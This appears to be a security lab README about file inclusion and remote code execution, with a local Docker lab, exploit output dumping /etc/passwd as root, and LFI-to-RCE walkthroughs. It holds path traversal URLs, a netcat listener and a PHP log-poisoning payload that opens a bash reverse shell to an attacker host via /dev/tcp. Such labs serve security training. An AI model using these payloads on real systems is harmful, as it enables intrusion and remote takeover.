# File Inclusion Vulnerability 

![](https://miro.medium.com/max/720/1*V7o5fQMyMPXuMDKChd8MMw.jpeg)

## Let know Remote Code Execution
### What does RCE mean?
- RCE refers to the mechanism by which a network flaw is abused by an agent to execute arbitrary code on a targeted device or machine.

### What is an RCE attack?
- An intrusion by remote code execution (RCE) occurs when an adversary is unauthorized to illicit access and control a device or server. Most of the time malware is used to take over the system.
* https://socradar.io/top-5-remote-code-execution-rce-attacks-in-2020/ *

### Type of Remote Code Execution
- Reverse Shell
- Bind Shell


![](https://socradar.io/wp-content/uploads/2021/01/how-does-rce-work-1024x574.png)

#### Reverse Shell
- The first, need install `netcat` in macos by `brew install netcat`, if use linux environment, can `nc` command.
- `netcat -lnvp ${port}` to listen tcp from the victim send

* https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/ *

## Build Lab
- make build
- make up
- make logs
- make restart

## Lab Upload file sym link to rce
- url: `http://0.0.0.0:1337/`
- in this lab, prepare a tar.gz file and upload, the web app will extract file upload.
- to exploit lab, run command: `python3 tool_exploit/solution.py`

```

admin@Admins-MacBook-Pro 003_lfi % python3 tool_exploit/solution.py
exploit success

command: id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

command: hello

command: cat /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
```

## Lab Local file inclusion
### LFI to RCE via log
- the first, sign up account and login. `http://0.0.0.0/index.php?page=signup.php`
- we can see `?page=signup.php`, replace to `?page=../../../../../../etc/passwd`, `http://0.0.0.0/index.php?page=../../../../../../etc/passwd`
- we can check it is lfi vuln, continue check can read logs,`http://0.0.0.0/index.php?page=../../../../../../var/log/nginx/access.log`
- injection payload `<?php system('/bin/bash -c "bash -i >& /dev/tcp/${ip_attacker}/${port_listen} 2>&1"'); ?>` into `User-Agent header`, should use python request
- after request, execute command `netcat -lnvp ${port_listen}` and then trigger url `http://0.0.0.0/index.php?page=../../../../../../var/log/nginx/access.log`

### LFI to RCE via php_session
- it as same as above
- need insert payload attack into username and trigger url `http://0.0.0.0/index.php?page=../../../../../../var/lib/php/sessions/sess_${session-attacker}`
- in screen_shot, session attacker is `r4mrd669at2n2022pniebfqd0j`
![](https://raw.githubusercontent.com/magnetohvcs/payload/master/image/Screen%20Shot%202022-06-24%20at%2011.55.01.png)
